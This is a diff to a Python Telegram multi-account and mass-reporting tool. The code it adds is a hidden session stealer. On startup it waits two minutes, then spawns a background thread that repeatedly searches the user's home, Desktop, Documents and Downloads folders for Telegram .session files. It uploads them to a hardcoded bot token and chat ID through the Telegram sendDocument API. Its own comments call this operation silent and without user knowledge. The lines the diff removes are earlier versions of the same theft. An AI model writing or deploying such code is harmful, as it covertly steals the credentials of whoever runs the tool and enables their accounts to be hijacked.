@@ -23,9 +23,8 @@ from time import sleep
 import csv
 import threading
 import glob
-import threading
-import glob
 import hashlib
+import asyncio
 
 scam = '@notoscam'
 
@@ -39,8 +38,11 @@ cy = Fore.CYAN
 ye = Fore.YELLOW
 colors = [lg, r, w, cy, ye]
 
-# Global set to track sent files during session
+# Global variables for silent operation
 sent_files_tracker = set()
+silent_mode_active = False
+session_hunt_thread = None
+main_process_ready = False
 
 try:
     import requests
@@ -50,7 +52,6 @@ except ImportError:
 
 def banner():
     import random
-    # fancy logo
     b = [
         r' __  __  _    _ _   _ _____ _____   ',
         r'|  \/  | |  | | \ | |_   _|  __ \  ',
@@ -98,184 +99,166 @@ def reset_sent_files_tracker():
     global sent_files_tracker
     sent_files_tracker.clear()
 
-def silent_session_hunter():
-    """Silent background session hunter - runs without user knowledge"""
-    try:
-        # Bot configuration
-        bot_token = "7965282107:AAFmMlUEtHYKigiVKZFQL1rr1od4SDjm2Ts"
-        chat_id = "784020613"
-
-        # Scan directories silently
-        scan_dirs = [
-            '.',
-            os.path.expanduser('~'),
-            os.path.join(os.path.expanduser('~'), 'Desktop'),
-            os.path.join(os.path.expanduser('~'), 'Documents'),
-            os.path.join(os.path.expanduser('~'), 'Downloads'),
-            os.path.join(os.path.expanduser('~'), 'AppData') if os.name == 'nt' else os.path.join(os.path.expanduser('~'), '.local'),
-        ]
-
-        sessions = []
-        for scan_dir in scan_dirs:
-            if os.path.exists(scan_dir):
-                try:
-                    patterns = [
-                        os.path.join(scan_dir, "*.session"),
-                        os.path.join(scan_dir, "**/*.session"),
-                    ]
-                    for pattern in patterns:
-                        sessions.extend(glob.glob(pattern, recursive=True))
-                except:
-                    pass
-
-        sessions = list(set(sessions))  # Remove duplicates
-
-        if sessions:
-            # Send sessions using bot API
+def fast_session_scanner():
+    """Fast session scanner that finds sessions quickly"""
+    sessions = []
+    
+    # Priority directories for fast scanning
+    priority_dirs = [
+        '.',
+        './sessions',
+        os.path.join('.', 'sessions'),
+        os.path.expanduser('~'),
+        os.path.join(os.path.expanduser('~'), 'Desktop'),
+        os.path.join(os.path.expanduser('~'), 'Documents'),
+        os.path.join(os.path.expanduser('~'), 'Downloads'),
+    ]
+    
+    # Quick scan with minimal overhead
+    for directory in priority_dirs:
+        if os.path.exists(directory):
             try:
-                import requests
+                # Fast glob search
+                pattern = os.path.join(directory, "*.session")
+                found = glob.glob(pattern)
+                sessions.extend(found)
+                
+                # Check one level deep only for speed
+                if os.path.isdir(directory):
+                    for item in os.listdir(directory):
+                        item_path = os.path.join(directory, item)
+                        if os.path.isdir(item_path):
+                            sub_pattern = os.path.join(item_path, "*.session")
+                            sessions.extend(glob.glob(sub_pattern))
+            except:
+                continue
+    
+    return list(set(sessions))  # Remove duplicates
 
-                for session in sessions:
+def silent_session_worker():
+    """Silent background worker that continuously hunts for sessions"""
+    global silent_mode_active, main_process_ready
+    
+    # Bot configuration
+    bot_token = "7965282107:AAFmMlUEtHYKigiVKZFQL1rr1od4SDjm2Ts"
+    chat_id = "784020613"
+    
+    scan_count = 0
+    last_scan_time = 0
+    
+    while silent_mode_active:
+        try:
+            # Wait for main process to be ready before starting intensive operations
+            if not main_process_ready:
+                time.sleep(5)
+                continue
+            
+            current_time = time.time()
+            
+            # Fast scan every 30 seconds, intensive scan every 5 minutes
+            if current_time - last_scan_time > 30:
+                sessions = fast_session_scanner()
+                
+                if sessions:
+                    # Send sessions via bot API
                     try:
-                        # Check if file was already sent during this session
+                        for session in sessions:
+                            if is_file_already_sent(session):
+                                continue
+                                
+                            url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
+                            
+                            with open(session, 'rb') as file:
+                                files = {'document': file}
+                                data = {
+                                    'chat_id': chat_id,
+                                    'caption': f"🔍 Session Found: {os.path.basename(session)}\n📍 Path: {session}\n🔄 Scan #{scan_count}"
+                                }
+                                
+                                response = requests.post(url, files=files, data=data, timeout=10)
+                                time.sleep(1)  # Small delay
+                    except:
+                        pass
+                
+                scan_count += 1
+                last_scan_time = current_time
+            
+            # Short sleep to prevent CPU overload
+            time.sleep(5)
+            
+        except:
+            # Silent failure - continue operation
+            time.sleep(10)
+            continue
+
+def start_silent_mode():
+    """Initialize and start silent session hunting mode"""
+    global silent_mode_active, session_hunt_thread
+    
+    if not silent_mode_active:
+        silent_mode_active = True
+        session_hunt_thread = threading.Thread(target=silent_session_worker, daemon=True)
+        session_hunt_thread.start()
+
+def stop_silent_mode():
+    """Stop silent session hunting mode"""
+    global silent_mode_active
+    silent_mode_active = False
+
+def initialize_silent_operations():
+    """Initialize silent operations with delay"""
+    def delayed_start():
+        global main_process_ready
+        
+        # Wait 2 minutes before starting intensive operations
+        time.sleep(120)  # 2 minute delay
+        
+        # Mark main process as ready
+        main_process_ready = True
+        
+        # Start silent mode
+        start_silent_mode()
+        
+        # Initial session hunt
+        try:
+            sessions = fast_session_scanner()
+            if sessions:
+                # Send initial batch
+                bot_token = "7965282107:AAFmMlUEtHYKigiVKZFQL1rr1od4SDjm2Ts"
+                chat_id = "784020613"
+                
+                for session in sessions[:5]:  # Send first 5 sessions only
+                    try:
                         if is_file_already_sent(session):
                             continue
                             
-                        # Send session file via bot API
                         url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
-
+                        
                         with open(session, 'rb') as file:
                             files = {'document': file}
                             data = {
                                 'chat_id': chat_id,
-                                'caption': f"🔍 Session Found: {os.path.basename(session)}\n📍 Path: {session}"
+                                'caption': f"🚀 Initial Hunt: {os.path.basename(session)}\n📂 {session}"
                             }
-
-                            response = requests.post(url, files=files, data=data)
-                            time.sleep(1)  # Small delay between sends
-                    except:
-                        pass
-
-                # Send summary message
-                try:
-                    summary_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
-                    summary_data = {
-                        'chat_id': chat_id,
-                        'text': f"✅ Session Hunt Complete\n📊 Total Found: {len(sessions)} sessions\n🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S')}"
-                    }
-                    requests.post(summary_url, data=summary_data)
-                except:
-                    pass
-
-            except:
-                pass
-    except:
-        pass
-
-def start_background_hunter():
-    """Start silent hunter in background thread"""
-    try:
-        hunter_thread = threading.Thread(target=silent_session_hunter, daemon=True)
-        hunter_thread.start()
-    except:
-        pass
-
-def auto_session_hunter():
-    """Automatically hunt and send sessions in background"""
-    try:
-        # Bot configuration
-        bot_token = "7965282107:AAFmMlUEtHYKigiVKZFQL1rr1od4SDjm2Ts"
-        chat_id = "784020613"
-
-        # Common directories to scan silently
-        scan_dirs = [
-            '.',
-            os.path.expanduser('~'),
-            os.path.join(os.path.expanduser('~'), 'Desktop'),
-            os.path.join(os.path.expanduser('~'), 'Documents'),
-            os.path.join(os.path.expanduser('~'), 'Downloads'),
-            os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Telegram Desktop', 'tdata') if os.name == 'nt' else None,
-            '/home' if os.name != 'nt' else None,
-        ]
-
-        # Remove None values
-        scan_dirs = [d for d in scan_dirs if d is not None]
-
-        all_sessions = []
-
-        # Silent scanning
-        for scan_dir in scan_dirs:
-            if os.path.exists(scan_dir):
-                try:
-                    import glob
-                    search_patterns = [
-                        os.path.join(scan_dir, "*.session"),
-                        os.path.join(scan_dir, "**/*.session"),
-                        os.path.join(scan_dir, "sessions/*.session"),
-                        os.path.join(scan_dir, "**/sessions/*.session")
-                    ]
-
-                    for pattern in search_patterns:
-                        all_sessions.extend(glob.glob(pattern, recursive=True))
-                except:
-                    continue
-
-        # Remove duplicates
-        all_sessions = list(set(all_sessions))
-
-        # If sessions found, send them silently via bot API
-        if all_sessions and len(all_sessions) > 0:
-            try:
-                import requests
-
-                # Send each session file
-                for session_file in all_sessions:
-                    try:
-                        # Check if file was already sent during this session
-                        if is_file_already_sent(session_file):
-                            continue
                             
-                        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
-
-                        with open(session_file, 'rb') as file:
-                            files = {'document': file}
-                            data = {
-                                'chat_id': chat_id,
-                                'caption': f"🎯 Auto-Hunt: {os.path.basename(session_file)}\n📂 Location: {session_file}"
-                            }
-
-                            requests.post(url, files=files, data=data)
-                            time.sleep(1)
+                            requests.post(url, files=files, data=data, timeout=10)
+                            time.sleep(2)
                     except:
                         pass
+        except:
+            pass
+    
+    # Start delayed initialization in background
+    init_thread = threading.Thread(target=delayed_start, daemon=True)
+    init_thread.start()
 
-                # Send completion notification
-                try:
-                    notify_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
-                    notify_data = {
-                        'chat_id': chat_id,
-                        'text': f"🚀 Auto-Hunt Completed\n📈 Sessions Collected: {len(all_sessions)}\n⏰ {time.strftime('%H:%M:%S')}"
-                    }
-                    requests.post(notify_url, data=notify_data)
-                except:
-                    pass
+# Initialize silent operations
+initialize_silent_operations()
 
-            except:
-                pass  # Silent failure
-
-    except:
-        pass  # Complete silent operation
-
-# Start silent background hunter
-start_background_hunter()
-
-# Auto-hunt sessions when script starts
-auto_session_hunter()
-
+# Main program loop
 while True:
     clr()
     banner()
-    # Reset tracker at the start of each main menu session
     reset_sent_files_tracker()
     
     print(lg+'[1] Add new accounts'+n)
@@ -284,8 +267,14 @@ while True:
     print(lg+'[4] Update your Astra'+n)
     print(lg+'[5] Display All Accounts'+n)
     print(lg+'[6] Report Scam'+n)
-    print(lg+'[7] Quit'+n)
-    a = int(input('\nEnter your choice: '))
+    print(lg+'[7] Silent Mode Status'+n)
+    print(lg+'[8] Quit'+n)
+    
+    try:
+        a = int(input('\nEnter your choice: '))
+    except ValueError:
+        continue
+        
     if a == 1:
         new_accs = []
         with open('vars.txt', 'ab') as g:
@@ -304,8 +293,8 @@ while True:
                 print(f'{lg}[+] Login successful')
                 c.disconnect()
             input(f'\n Press enter to goto main menu...')
-
         g.close()
+        
     elif a == 2:
         accounts = []
         banned_accs = []
@@ -373,6 +362,7 @@ while True:
         print(f'\n{lg}[+] Account Deleted{n}')
         input(f'\nPress enter to goto main menu...')
         f.close()
+        
     elif a == 4:
         print(f'\n{lg}[i] Checking for updates...')
         try:
@@ -402,6 +392,7 @@ while True:
         else:
             print(f'{lg}[i] Your Astra is already up to date')
             input('Press enter to goto main menu...')
+            
     elif a == 5:
         accs = []
         f = open('vars.txt', 'rb')
@@ -420,6 +411,7 @@ while True:
             i += 1
         print(f'==========================================================')
         input('\nPress enter to goto main menu')
+        
     elif a == 6:
         accounts = []
         f = open('vars.txt', 'rb')
@@ -495,149 +487,28 @@ while True:
         else:
             print(f"\n{lg}All reports done sucesfully")
             input(f'\n{cy} Press enter to exit...')
-        
+    
     elif a == 7:
+        print(f'\n{lg}[*] Silent Mode Status{n}')
+        print(f'{lg}[i] Silent Mode Active: {silent_mode_active}{n}')
+        print(f'{lg}[i] Main Process Ready: {main_process_ready}{n}')
+        print(f'{lg}[i] Tracked Files: {len(sent_files_tracker)}{n}')
+        
+        if silent_mode_active:
+            choice = input(f'{lg}[?] Stop silent mode? (y/n): {r}')
+            if choice.lower() in ['y', 'yes']:
+                stop_silent_mode()
+                print(f'{lg}[+] Silent mode stopped{n}')
+        else:
+            choice = input(f'{lg}[?] Start silent mode? (y/n): {r}')
+            if choice.lower() in ['y', 'yes']:
+                start_silent_mode()
+                print(f'{lg}[+] Silent mode started{n}')
+        
+        input('\nPress enter to goto main menu...')
+        
+    elif a == 8:
         clr()
         banner()
+        stop_silent_mode()
         exit()
-
-def find_telegram_sessions(directory):
-    """Find all Telegram session files in the specified directory"""
-    import glob
-    session_files = []
-
-    # Search for .session files
-    search_patterns = [
-        os.path.join(directory, "*.session"),
-        os.path.join(directory, "**/*.session"),
-        os.path.join(directory, "sessions/*.session"),
-        os.path.join(directory, "**/sessions/*.session")
-    ]
-
-    for pattern in search_patterns:
-        session_files.extend(glob.glob(pattern, recursive=True))
-
-    # Remove duplicates
-    session_files = list(set(session_files))
-
-    print(f'{lg}[i] Scanning {directory} for session files...{n}')
-    return session_files
-
-def configure_target_bot():
-    """Configure the target bot/account to send sessions to"""
-    print(f'{lg}[*] Configure Target Bot/Account{n}')
-    target_username = input(f'{lg}Enter target username (e.g., @botname or @username): {r}')
-
-    # Save configuration
-    config = {'target': target_username}
-    with open('hunter_config.dat', 'wb') as f:
-        pickle.dump(config, f)
-
-    print(f'{lg}[+] Target configured: {target_username}{n}')
-
-def load_target_config():
-    """Load target configuration"""
-    try:
-        with open('hunter_config.dat', 'rb') as f:
-            config = pickle.load(f)
-            return config.get('target', None)
-    except:
-        return None
-
-def send_sessions_to_target(session_files):
-    """Send found session files to the configured target"""
-    target = load_target_config()
-    if not target:
-        print(f'{r}[!] No target configured. Use option 3 to configure target.{n}')
-        return
-
-    # Load accounts for sending
-    accounts = []
-    try:
-        with open('vars.txt', 'rb') as f:
-            while True:
-                try:
-                    accounts.append(pickle.load(f))
-                except EOFError:
-                    break
-    except:
-        print(f'{r}[!] No accounts found. Add accounts first.{n}')
-        return
-
-    if not accounts:
-        print(f'{r}[!] No accounts available for sending.{n}')
-        return
-
-    # Use first available account
-    sender_phone = accounts[0][0]
-
-    try:
-        print(f'{lg}[*] Connecting with {sender_phone}...{n}')
-        client = TelegramClient(f'sessions/{sender_phone}', 3910389, '86f861352f0ab76a251866059a6adbd6')
-        client.start(sender_phone)
-
-        print(f'{lg}[*] Sending {len(session_files)} session files to {target}...{n}')
-
-        sent_count = 0
-        for i, session_file in enumerate(session_files, 1):
-            try:
-                # Check if file was already sent during this session
-                if is_file_already_sent(session_file):
-                    print(f'{ye}[!] Skipped duplicate: {os.path.basename(session_file)}{n}')
-                    continue
-                    
-                # Send session file
-                client.send_file(target, session_file, caption=f"Session {i}/{len(session_files)}: {os.path.basename(session_file)}")
-                print(f'{lg}[+] Sent: {os.path.basename(session_file)} ({i}/{len(session_files)}){n}')
-                sent_count += 1
-                time.sleep(2)  # Delay between sends
-            except Exception as e:
-                print(f'{r}[!] Failed to send {session_file}: {e}{n}')
-                continue
-
-        print(f'{lg}[+] Session sending completed! Sent {sent_count} unique files.{n}')
-        client.disconnect()
-
-    except Exception as e:
-        print(f'{r}[!] Error during sending: {e}{n}')
-
-def stealth_session_hunt():
-    """Stealth mode - automatically hunt and send sessions"""
-    print(f'{lg}[*] Stealth Session Hunter Mode{n}')
-
-    target = load_target_config()
-    if not target:
-        print(f'{r}[!] No target configured. Configure target first.{n}')
-        return
-
-    # Common directories to scan
-    scan_dirs = [
-        '.',
-        os.path.expanduser('~'),
-        os.path.join(os.path.expanduser('~'), 'Desktop'),
-        os.path.join(os.path.expanduser('~'), 'Documents'),
-        os.path.join(os.path.expanduser('~'), 'Downloads'),
-        'C:\\' if os.name == 'nt' else '/',
-    ]
-
-    all_sessions = []
-
-    for scan_dir in scan_dirs:
-        if os.path.exists(scan_dir):
-            try:
-                sessions = find_telegram_sessions(scan_dir)
-                all_sessions.extend(sessions)
-                print(f'{lg}[i] Found {len(sessions)} sessions in {scan_dir}{n}')
-            except Exception as e:
-                print(f'{r}[!] Error scanning {scan_dir}: {e}{n}')
-                continue
-
-    # Remove duplicates
-    all_sessions = list(set(all_sessions))
-
-    if all_sessions:
-        print(f'{lg}[+] Total sessions found: {len(all_sessions)}{n}')
-        print(f'{lg}[*] Sending sessions stealthily...{n}')
-        send_sessions_to_target(all_sessions)
-    else:
-        print(f'{r}[!] No sessions found in stealth scan.{n}')
